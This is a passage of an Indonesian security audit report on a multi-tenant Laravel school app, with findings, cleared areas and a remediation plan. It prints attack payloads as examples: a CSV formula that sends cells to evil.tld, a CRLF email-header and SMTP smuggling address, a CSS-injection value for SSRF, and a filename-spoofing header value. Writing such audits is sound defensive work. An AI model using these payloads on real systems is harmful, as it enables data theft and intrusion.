**Fakta yang diverifikasi:** tabel `roles` **tidak punya kolom `school_id`** (`Schema::getColumnListing` → `id, name, guard_name, created_at, updated_at`) dan `app/Models/Role.php` tidak memakai `BelongsToSchool`. Role bersifat **global**.

**Skenario serangan:** pemegang `roles.access` yang bukan super admin mengirim `PUT /admin/roles/{id-role-ADMIN}` dengan `permissions[]=impersonate.access&permissions[]=schools.access`. Perubahan itu langsung berlaku untuk **seluruh pengguna ber-role ADMIN di keenam sekolah sekaligus**. Sebaliknya, mencabut permission role lain = DoS terhadap tenant lain.

**Prasyarat:** `roles.access` bukan default untuk Admin (`AppModule::defaultsFor` hanya memberikannya ke SuperAdmin), tetapi terjangkau lewat dua jalur yang didukung: (a) `store()` di baris 35-50 tidak punya kunci apa pun, (b) `extra_permissions` di C-1.

**Perbaikan:** wajibkan super admin untuk semua aksi tulis di controller ini. Jika kelak role per-sekolah dibutuhkan, tambahkan kolom `school_id` pada `roles` — itu perubahan struktural yang perlu direncanakan.

---

#### M-2. `ImageConverter` fallback menyimpan berkas dengan ekstensi pilihan penyerang ke disk publik

**Severity:** Medium
**Berkas:** `app/Services/ImageConverter.php:28-34`

```php
if (! $source) {
    // Fallback: store original file as-is if GD can't process
    $path = trim($directory, '/').'/'.Str::ulid().'.'.$file->getClientOriginalExtension();   // ← ekstensi dari klien
    Storage::disk($disk)->put($path, file_get_contents($file->getPathname()));
    return $path;
}
```

**Terverifikasi (tinker + Validator asli):** berkas bernama `frame.html` berisi signature PNG + IHDR valid lalu data rusak menghasilkan `getMimeType() = image/png`, `guessExtension() = png`, `getClientOriginalExtension() = html`. Rule `['required','image','max:5120']` di `Admin/FrameController.php:45`, `KartuBebas/FrameController.php:44`, dan `PengaturanController.php:113/130` **lolos** — Laravel memeriksa hasil sniffing `finfo`, bukan apakah GD bisa men-decode. `imagecreatefrompng()` mengembalikan `false` → masuk cabang fallback → tersimpan sebagai `frames/01KYH27T9R5T8NB5Y275WZDTG4.html`. Tidak ada CSP maupun `X-Content-Type-Options: nosniff` di mana pun, jadi nginx melayaninya sebagai `text/html` di origin aplikasi.

**Skenario serangan:** user dengan `frames.access` atau `pengaturan.access` mengunggah berkas seperti itu berisi `<script>`, lalu mengirim tautan asetnya ke SUPER_ADMIN ("cek frame baru saya"). Skrip berjalan same-origin dengan sesi admin.

**Mengapa medium, bukan high:** `image_url` hanya dirender sebagai `<img src>` atau CSS `url()` — konteks itu tidak mengeksekusi skrip. Eksploitasi mensyaratkan korban **menavigasi langsung** ke URL aset mentah, jadi butuh langkah rekayasa sosial.

**Perbaikan:**

```php
// ImageConverter.php:30 — jangan pakai ekstensi dari klien
$extension = match ($file->getMimeType()) {
    'image/jpeg' => 'jpg',
    'image/png'  => 'png',
    'image/webp' => 'webp',
    'image/gif'  => 'gif',
    default      => throw ValidationException::withMessages(['file' => 'Format gambar tidak didukung.']),
};
$path = trim($directory, '/').'/'.Str::ulid().'.'.$extension;
```

Tambahkan juga `mimes:jpg,jpeg,png,webp` pada keempat controller upload, dan kirim header `X-Content-Type-Options: nosniff` untuk `/storage/*` di konfigurasi nginx.

---

#### M-3. Upload logo & favicon menulis ke tabel `settings` global — admin satu sekolah mengubah branding semua tenant

**Severity:** Medium
**Berkas:** `app/Http/Controllers/Admin/PengaturanController.php:115-121` (logo) dan `:132-138` (favicon)

```php
$oldPath = Setting::getValue('app_logo', '');
if ($oldPath && Storage::disk('public')->exists($oldPath)) {
    Storage::disk('public')->delete($oldPath);      // ← menghapus aset lama, permanen
}
$path = $converter->storeAsWebp($request->file('logo'), 'images/branding', 'public', 85, 512);
Setting::setValue('app_logo', $path);                // ← satu baris global
```

`app/Models/Setting.php` adalah Model biasa tanpa `BelongsToSchool`, dan migrasi `create_settings_table` mendefinisikan `settings(id, key UNIQUE, value, description)` — **tanpa `school_id`**, dan unique key membuat baris per-sekolah mustahil secara skema.

Permission `pengaturan.access` diberikan ke role Admin setiap sekolah (`AppModule.php:111`). `HandleInertiaRequests.php:97-104` membagikan `app.logo`/`app.favicon` dari kunci global itu ke setiap respons Inertia, dan `resources/views/app.blade.php:34-42` membaca `app_favicon` di root Blade — jadi **halaman publik semua tenant** (`/scan/{token}`, `/daftar`) ikut terdampak.

Menariknya, `PengaturanController::update()` (baris 86-99) **menulis ke `$school->settings`** — pola per-tenant sudah ada; hanya dua aksi upload ini yang melewatinya.

**Perbaikan:** simpan branding di `$school->settings['app_logo']` dan baca dari `app('currentSchool')` di `HandleInertiaRequests`. Jika branding global memang disengaja, pindahkan kedua endpoint upload ke modul yang hanya dipegang SUPER_ADMIN.

---

#### M-4. CSV formula injection — nama/NIS dari pendaftaran publik ditulis mentah ke export CSV

**Severity:** Medium
**Berkas:** `app/Http/Controllers/Admin/LaporanController.php:89-99`; `app/Http/Controllers/Admin/StudentReportController.php:137-178`

```php
fputcsv($handle, [
    $row['nis'],
    $row['full_name'],       // ← tanpa netralisasi
    $row['classroom_name'],
    ...
]);
```

`fputcsv` hanya meng-quote koma dan kutip; ia **tidak** menetralkan `=`, `+`, `-`, `@`. BOM UTF-8 di `LaporanController.php:74` dan `StudentReportController.php:168` justru mendorong Excel memperlakukan berkas sebagai spreadsheet.

**Skenario serangan:** penyerang mendaftar di `/daftar` (publik, `throttle:10,1`) dengan `full_name` = `=HYPERLINK("https://evil.tld/?x="&A1&B1&C1,"Klik untuk lihat rapor")`. `StudentRegistrationController.php:49-52` hanya memvalidasi `string|max:255` — tanpa regex atau whitelist karakter; `Student` tidak punya mutator/cast pada `full_name`. Ketika admin mengunduh CSV dan membukanya di Excel/LibreOffice, rumus dieksekusi di mesin admin — varian `HYPERLINK` cukup satu klik tanpa peringatan makro; varian DDE (`=cmd|...`) butuh persetujuan prompt.

Jalur `StudentReportController` tidak butuh prasyarat apa pun (`full_name` masuk ke preamble tanpa syarat). Jalur `LaporanController` butuh siswa palsu itu punya baris absensi.

**Perbaikan (awal):** helper `csvSafe()` yang melarikan awalan `=+-@`, dipakai di kedua sink CSV.

**Perbaikan (berlaku sekarang):** seluruh ekspor pindah ke XLSX dan `csvSafe()` dihapus — nol pemanggil setelah `fputcsv` terakhir hilang. Penangkalnya sekarang tipe sel, bukan pelarian awalan: `App\Support\XlsxDownload` membangun `new StringCell(...)` secara eksplisit, sehingga teks tetap teks apa pun karakter pertamanya.

Ini **bukan** kekebalan gratis dari format XLSX. `OpenSpout\Common\Entity\Cell::fromValue()` memeriksa `'=' === $value[0]` dan mengembalikan `FormulaCell`, jadi menulis lewat `Row::fromValues()` akan memindahkan kerentanan ini utuh ke format baru sambil menghapus penjaganya. `XlsxDownload` sengaja tidak pernah memanggil `fromValue()`; `tests/Feature/XlsxExportTest.php` menjaganya dengan membaca ulang berkas hasil ekspor.

Defense in depth di `StudentRegistrationController`: `'full_name' => [..., 'regex:/^[\p{L}\p{N} .,\'\-]+$/u']` dan `'nis'|'nisn' => [..., 'alpha_num']`.

---

#### M-5. Header/SMTP injection tak-terautentikasi via `POST /daftar` — `laravel/framework` 13.9.0 + `symfony/mime` 8.0.9

**Severity:** Medium
**Berkas:** `app/Http/Controllers/StudentRegistrationController.php:61`; `app/Services/ParentProfileService.php:17,45`; `app/Services/Notification/DefaultEmailGateway.php:31`
**CVE:** GHSA-5vg9-5847-vvmq (framework), CVE-2026-45067 (symfony/mime)

**Terverifikasi empiris di repo ini** (versi terpasang: `laravel/framework` v13.9.0, `symfony/mime` v8.0.9, `symfony/mailer` v8.0.8):

1. Payload `"victim\r\nBcc: attacker@evil.com"@example.com` **lolos** rule `email` Laravel 13.9.0 (`Validator::make(...)->fails() === false`; juga lolos `email:rfc`).
2. `Symfony\Component\Mime\Address` 8.0.9 menerimanya dan `getEncodedAddress()` masih memuat byte `0d0a` — `Address.php:50-55` hanya strip CR/LF dari `$name`, bukan `$address`.
3. Lewat `Mail::mailer('array')->raw()->to($payload)`, header nyata terpecah menjadi `To: "victim` + baris `Bcc: ...`, **dan** `Envelope::getRecipients()[0]->getEncodedAddress()` masih ber-CRLF sehingga masuk mentah ke `SmtpTransport.php:257` `sprintf("RCPT TO:<%s>\r\n", $address)` → SMTP command smuggling ke relay terautentikasi milik sekolah.

Jalur simpan bersih dari filter: `StudentRegistrationController.php:61` → `:126` → `ParentProfileService.php:17,45` (hanya `trim()`); `ParentProfile` tanpa cast/mutator.

**Mengapa medium, bukan high:** sink tidak bisa dipicu penyerang secara langsung. Satu-satunya pemanggil di jalur publik adalah `NotificationDispatcher.php:75-84` yang butuh record `Attendance` — jadi penyerang harus memegang `scanner_token` sekolah (`Str::random(40)`, tidak bisa ditebak) untuk men-scan siswa palsunya, **atau** tahu `whatsapp_number` orang tua asli yang emailnya masih kosong (`ParentProfileService.php:24-26` hanya mengisi bila `empty($existing->email)` — tidak bisa menimpa). Selain itu butuh channel EMAIL aktif dengan `smtp_host` terisi; DB saat ini hanya punya channel `OZOLAB_WA`.

*Koreksi:* payload PoC di atas tidak menghasilkan Bcc sungguhan — pengiriman ditentukan `RCPT TO` dari Envelope; header `Bcc:` yang tersuntik ke DATA hanya teks. Yang benar-benar eksploitatif adalah SMTP command smuggling dengan payload yang dirancang khusus.

**Perbaikan:**

```bash
composer require laravel/framework:^13.10    # terpasang 13.9.0; aman mulai 13.10.0
composer update symfony/mime symfony/mailer  # naikkan ke >= 8.0.12
```

Ditambah pertahanan berlapis di kode (jangan hanya andalkan paket): tambahkan `'regex:/^[^\r\n]*$/'` pada setiap rule email di `StudentRegistrationController.php:61`, `Admin/OrangTuaController.php:65,146`, dan `Admin/NotificationGatewayController.php:177` (yang bahkan tidak punya rule `email` sama sekali — hanya `string|min:5`). Di `ParentProfileService.php:17`, tolak nilai yang mengandung `\r`/`\n` alih-alih sekadar `trim()`.

Tambahkan test Pest: POST `/daftar` dengan `parent_email` berisi CRLF harus mengembalikan 422.

*Catatan negatif yang sudah diuji — jangan ikut ditambal keliru:* Subject **tidak** rentan. `full_name` ber-CRLF tetap di-encode dan di-fold dengan benar oleh Symfony.

---

### 🟢 LOW

---

#### L-1. Pendaftaran siswa publik tanpa captcha memicu render headless Chrome

**Severity:** Low
**Berkas:** `app/Http/Controllers/StudentRegistrationController.php:48`, `:139`; `app/Jobs/RegisterStudentCardsJob.php:81-91`

`POST /daftar` tanpa auth, hanya `throttle:10,1`. Flag `generate_cards` sepenuhnya dikendalikan klien **tanpa syarat ada foto**, sehingga penyerang anonim dapat memaksa 2 job render Browsershot/Chrome per request (timeout 180 detik). Setiap pendaftaran juga membuat baris `users` ber-role OrangTua (`ParentProfileService::findOrCreateFromRegistration:32-40`).

*Yang berhasil dibantah dari laporan awal:* sekolah soft-deleted **tidak** bisa disuntik — `School::...->findOrFail()` di baris 97 menerapkan `SoftDeletingScope` dan melempar 404 **sebelum** transaksi. ULID sekolah nonaktif juga tidak pernah dipublikasikan (`index()` baris 31 memfilter `is_active`). Antrean notifikasi juga **tidak** tersumbat: `RegisterStudentCardsJob` memakai `onQueue(config('cards.queue'))` = queue `cards`, terpisah dari `default`.

**Perbaikan:** tambahkan honeypot/captcha ringan, syaratkan `generate_cards` hanya bila foto tersedia, dan tambahkan throttle harian per IP.

---

#### L-2. Pesan galat Google Drive diteruskan mentah ke pemanggil anonim

**Severity:** Low
**Berkas:** `app/Http/Controllers/StudentRegistrationController.php:267`, `:325`

```php
return response()->json(['found' => false, 'message' => 'Gagal mengambil foto: '.$e->getMessage()]);
```

Endpoint publik (lihat C-2) membedakan dengan jelas `"Google Drive belum dikonfigurasi untuk sekolah ini."` vs `"Credentials Google Drive belum diset."` vs jalur sukses — penyerang anonim memetakan sekolah mana yang punya Drive aktif dalam 6 request. Baris 267/325 juga meneruskan `$e->getMessage()` dari `Google\Service\Exception` apa adanya; tidak ada handler global yang menyaringnya (`bootstrap/app.php:38-41` hanya menangani `HttpExceptionInterface`).

*Klaim yang tidak terbukti:* pesan ini tidak membocorkan alamat service account, scope, maupun credentials — hanya status konfigurasi dan pesan Drive generik.

**Perbaikan:** kembalikan pesan generik ke klien (`'Foto tidak dapat diambil.'`) dan catat detail exception hanya ke log.

---

#### L-3. Arsip album kelas ditulis ke disk publik dengan nama berbasis timestamp saja

**Severity:** Low
**Berkas:** `app/Http/Controllers/Admin/AlbumGenerationController.php:95`; `app/Services/AlbumGeneratorService.php:47-52`

```php
$zipName = sprintf('albums/%d/album-%s.zip', $school->id, now()->format('Ymd-His'));
```

ZIP berisi foto + nama + NIS seluruh siswa satu kelas, tersimpan permanen di disk `public` (`response()->download()` dipanggil tanpa `deleteFileAfterSend()`; tidak ada scheduled cleanup untuk direktori `albums`). Satu-satunya entropi adalah detik pembuatan — penyerang yang tahu harinya cukup mencoba 86.400 URL per sekolah.

**Mengapa low:** foto yang jadi isinya sudah publik dengan nama yang **jauh lebih mudah** ditebak (lihat H-7), jadi album tidak membuka kelas data baru; nilai tambahnya hanya agregasi roster.

**Perbaikan:** tambahkan `Str::random(16)` pada nama zip/halaman, atau tulis ke disk `local` lalu `response()->download(...)->deleteFileAfterSend(true)`.

---

#### L-4. `layout_config` kartu tidak divalidasi isinya — injeksi CSS ke dalam blok `<style>` yang dirender headless Chrome

**Severity:** Low
**Berkas:** `resources/views/cards/student-card.blade.php:64`, `:76`; `app/Http/Controllers/Admin/CardLayoutController.php:61`, `:114`; `app/Models/SchoolCardLayout.php:82`

```php
'layout_config' => ['required', 'array'],   // ← satu-satunya validasi
```

```blade
background: linear-gradient(180deg, {{ $hGradStart }} 0%, {{ $hGradEnd }} 100%);
.header-text { color: {{ $hTextColor }}; }
```

Admin sekolah dengan `card-layouts.access` (dimiliki role Admin bawaan) mengirim `header_text_color` = `#000 } body { background: url(http://127.0.0.1:8080/) } .x {`. `<style>` adalah *raw-text element*, sehingga escaping Blade tidak berpengaruh (terverifikasi: `htmlspecialchars(payload, ENT_QUOTES)` mengembalikan string identik). Chrome (`--no-sandbox`, `waitUntilNetworkIdle()`) memuat URL itu dari dalam jaringan server → **blind SSRF**.

*Koreksi terhadap klaim awal:* `@import` **tidak** jalan (per spec CSS harus mendahului semua rule); yang bekerja hanya `url()` pada property atau blok `@font-face{src:url()}` yang disuntik. Ini SSRF **buta** — respons tidak bisa dibaca dan tidak muncul di PNG hasil render. Dampak sampingan yang paling nyata justru DoS ringan: URL menggantung membuat setiap render kartu menunggu sampai timeout 120 detik di worker queue.

**Perbaikan:** validasi ketiga key warna dengan `['nullable','regex:/^#[0-9a-fA-F]{3,8}$/']`, atau saring key tak dikenal di `SchoolCardLayout::normalizedConfig()`. Blokir egress non-loopback dari worker render.

---

#### L-5. NIS dari pendaftaran publik masuk mentah ke header `Content-Disposition`

**Severity:** Low
**Berkas:** `app/Http/Controllers/Admin/SiswaController.php:148-153`

```php
$filename = 'qr-'.$siswa->nis.'-'.Str::slug($siswa->full_name).'.svg';   // ← nis tidak di-slug

return response($svg, 200, [
    'Content-Type'        => 'image/svg+xml',
    'Content-Disposition' => 'attachment; filename="'.$filename.'"',
]);
```

`full_name` sudah dinormalisasi lewat `Str::slug`, tapi `$siswa->nis` tidak. `StudentRegistrationController.php:50` memvalidasi `nis` hanya sebagai `nullable|string|max:50` di endpoint publik.

*Koreksi PoC:* payload `a"; filename="x.html` **tidak** bekerja — Chrome dan Firefox memakai parameter `filename` yang **pertama**. Yang benar-benar bekerja adalah `x"; filename*=UTF-8''evil.html; z="` (35 karakter, muat di `max:50`), karena `filename*` mengalahkan `filename` per RFC 6266.

**Mengapa low:** response splitting mustahil (PHP `header()` menolak CR/LF). Isi berkas tidak pernah dikendalikan penyerang — `QrTokenGenerator::renderSvg` mengembalikan SVG murni hasil BaconQrCode, jadi berkas yang di-*rename* `.html` hanya memberi error parse XML. Ini murni filename spoofing dengan konten inert.

**Perbaikan:**

```php
$filename = 'qr-'.Str::slug($siswa->nis.'-'.$siswa->full_name).'.svg';
// atau serahkan quoting ke framework:
'Content-Disposition' => HeaderUtils::makeDisposition(HeaderUtils::DISPOSITION_ATTACHMENT, $filename),
```

Tambahkan juga rule `alpha_num` untuk `nis` dan `nisn` di `StudentRegistrationController::store`.

---

## 3. Area yang Diperiksa dan Ternyata Sudah Aman

Bagian ini penting untuk kejelasan cakupan — hal-hal berikut sempat dicurigai, diselidiki serius, lalu **digugurkan** karena tidak dapat dieksploitasi.

| Area | Kesimpulan |
|---|---|
| **Modul Kartu Bebas / Card Form tanpa `school_id`** | Benar tabel `card_forms`/`card_form_submissions`/`card_datasets` tidak ber-tenant dan `RecordController::destroy` tidak cek kepemilikan. Tapi kedua modul di grup "Sistem" dan `AppModule::defaultsFor()` **hanya** memberikannya ke SuperAdmin — yang memang berhak global. Permukaan publik `/f/{token}` memakai `Str::random(40)` + `throttle:10,1` dan `Public\CardFormController::status:149` melakukan `abort_unless($submission->card_form_id === $form->id, 404)`. Risiko laten saja, bukan kerentanan aktif. |
| **`StatsAggregator` memakai `DB::table()` mentah tanpa filter `school_id`** | Dead code. `grep -rn "StatsAggregator"` hanya menemukan deklarasi kelasnya sendiri — tidak ada route, controller, command, job, atau binding. `DashboardController` sudah mengimplementasi ulang fitur yang sama dengan filter eksplisit `->where('students.school_id', $schoolId)`. Hapus saja sebagai pembersihan, bukan temuan keamanan. |
| **Berkas preview di `storage/app/public/temp` menumpuk tanpa batas** | Salah. `app/Console/Commands/CleanTempPreviews.php` (`temp:clean`) terjadwal `hourly()` di `bootstrap/app.php:69-71`. Scheduler di Laravel 11+ memang dideklarasikan di `bootstrap/app.php`, bukan `routes/console.php`. |
| **Validasi `unique` NISN di form publik sebagai orakel keberadaan** | Perilaku fungsional wajib, setara "email sudah terdaftar" di form signup mana pun. NISN memang ID nasional yang unik lintas sekolah (index unik global di migrasi). Tidak ada data lintas sekolah yang bocor — penyerang hanya tahu "ada record dengan NISN ini di suatu tempat", tanpa tahu sekolah mana. Ruang NISN 10 digit + `throttle:10,1` membuat enumerasi buta mustahil. |
| **Google Drive query injection lewat nama siswa (`findOrCreateFolder`)** | Escaping backslash memang cacat, tapi eksploitasi yang diklaim tidak jalan: template selalu memancarkan `' and mimeType = ` setelah titik injeksi, dan paritas kutipnya (3 kutip setelahnya, ganjil) tidak bisa diperbaiki penyerang. Semua variasi payload berakhir HTTP 400 dari Drive. Kegagalannya pun terkurung dalam `try/catch` yang hanya membuat pendaftaran penyerang sendiri melewati upload. **Namun** cacat escaping-nya tetap perlu diperbaiki sebagai higienitas — lihat C-2 poin 2. |
| **Kunci HMAC QR default string kosong** | Salah atribusi sebab. `hash_hmac` muncul **tepat sekali** di seluruh aplikasi (sisi generate); tidak ada perhitungan HMAC di sisi verifikasi sama sekali. Rotasi rahasia tidak berefek baik kuncinya kosong maupun 512 bit, karena `verify()` hanya melakukan lookup DB. Resistensi pemalsuan datang dari `$nonce = bin2hex(random_bytes(8))` (64 bit CSPRNG) yang tidak pernah keluar dari pemanggilan `generate`. Yang perlu diperbaiki hanya docblock keliru di `QrTokenGenerator.php:14-18` dan dead config key `config/attendance.php:62`. Masalah sesungguhnya di area ini adalah H-6, bukan kuncinya. |

Selain itu, hal-hal berikut diperiksa dan tidak menemukan masalah: SQL injection (semua query lewat Eloquent atau query builder ber-binding), mass assignment (`$fillable` terkendali di seluruh model), CSRF (aktif tanpa pengecualian), soft delete (`findOrFail` menghormati scope), pemisahan queue (`cards` vs `default`), rate limiting di seluruh endpoint publik, dan `routes/api.php` yang sudah ditutup di balik `['web','auth']`.

---

## 4. Rekomendasi Prioritas

### Tahap 1 — Kerjakan minggu ini (menutup 2 critical + 4 high, ±1 hari kerja)

| # | Tindakan | Berkas | Estimasi |
|---|---|---|---|
| 1 | Batasi `extra_permissions` ke modul non-Sistem ∩ permission pemberi, plus blokir self-edit role/permission | `UserManagementController.php:116-138` | 1 jam |
| 2 | `abort_unless(isSuperAdmin())` di seluruh `SchoolController` dan `NotificationGatewayController`; berhenti mengirim model `School` mentah ke Inertia | 2 controller | 1 jam |
| 3 | `abort_unless($impersonator->isSuperAdmin(), 403)` di `ImpersonationController::store` | `:26` | 10 menit |
| 4 | Tutup `/daftar/preview-photo` & `/daftar/crop-preview` di balik `auth` + `permission:siswa.access`; ganti `name contains` → `name =`; hapus fallback `'root'`; escape backslash | `StudentRegistrationController.php`, `GoogleDriveService.php` | 2 jam |
| 5 | Perbaiki penjaga webhook Telegram (`hash_equals` + tolak secret kosong) dan paksa `is_active=false` pada early-return `syncTelegramConnection` | `TelegramWebhookController.php:29`, `NotificationGatewayController.php:117-155` | 30 menit |
| 6 | Tambahkan `permission:siswa.access` pada grup `routes/api.php` | `routes/api.php:23` | 5 menit |

Setiap butir wajib disertai test Pest (proyek ini punya aturan test enforcement di `CLAUDE.md`). Test regresi minimal: Admin sekolah A **tidak** bisa memberi dirinya `schools.access`, **tidak** bisa impersonate user sekolah B, dan orang tua **tidak** bisa memanggil `/api/students`.

### Tahap 2 — Minggu berikutnya (sisa high)

7. **H-6 (`qr_token` fallback NIS)** — butuh sedikit desain karena input NIS manual di gerbang adalah fitur yang dipakai. Rencana: `findByQrToken()` untuk jalur publik, sisakan fallback NIS untuk `Admin\ScannerController`, tambahkan PIN kiosk untuk input manual, dan **pangkas payload respons publik** (hapus `address`, `birth_date`, `birth_place`, `religion`, `nisn`) — pemangkasan payload ini bisa dikerjakan langsung dalam 15 menit dan sudah mengurangi dampak drastis.
8. **H-8 (`photo_temp`)** — tambahkan regex `^temp/preview-[A-Za-z0-9]{16}\.jpg$`. 15 menit; kerjakan bersamaan dengan #4.
9. **H-7 (bug `sprintf %d`)** — perbaikan kodenya 10 menit, tapi butuh **skrip migrasi berkas + update kolom `photo_path`** untuk data produksi yang sudah ada. Jadwalkan di jendela maintenance. Sebagai mitigasi sementara sebelum migrasi, tambahkan `Str::random(16)` pada nama berkas baru agar tidak menambah tabrakan.

### Tahap 3 — Bulan ini (medium)

10. `composer require laravel/framework:^13.10` + `composer update symfony/mime symfony/mailer` (M-5) — mudah, kerjakan lebih awal jika ada jendela deploy.
11. ~~Helper `csvSafe()` di kedua sink CSV~~ → seluruh ekspor pindah ke XLSX lewat `App\Support\XlsxDownload` (M-4).
12. `ImageConverter` ekstensi dari mime hasil sniffing + `mimes:` rule di 4 controller upload (M-2).
13. Pindahkan branding logo/favicon ke `$school->settings` (M-3).
14. Super-admin-only untuk semua aksi tulis `RolePermissionController` (M-1).

### Tahap 4 — Backlog (low + hardening struktural)

15. Temuan L-1 s/d L-5.
16. **Perbaikan struktural yang layak dipertimbangkan** (bukan temuan, tapi akan mencegah kelas masalah ini berulang):
    - Buat `SchoolPolicy` dan `UserPolicy`, lalu pakai `authorizeResource` — saat ini permission adalah satu-satunya lapisan otorisasi, tanpa lapisan "boleh mengubah objek yang mana".
    - Tambahkan test arsitektur Pest yang memastikan setiap controller di `app/Http/Controllers/Admin/` yang menerima route-model binding lintas-tenant memanggil sebuah pemeriksaan otorisasi.
    - Tambahkan header `X-Content-Type-Options: nosniff` dan CSP dasar; keduanya tidak ada saat ini dan akan meredam M-2 sepenuhnya.
    - Pindahkan foto siswa dan kartu ke disk privat yang disajikan lewat route ber-otorisasi — akan menutup H-7, H-8, dan L-3 sekaligus.
    - Hapus `app/Services/Dashboard/StatsAggregator.php` (dead code).

---

*Laporan ini disusun dari pembacaan kode dan verifikasi eksekusi terhadap kode pada commit `a567bc4` (branch `main`). Seluruh berkas probe/test sementara yang dibuat selama verifikasi sudah dihapus; tidak ada perubahan yang tertinggal di repositori.*
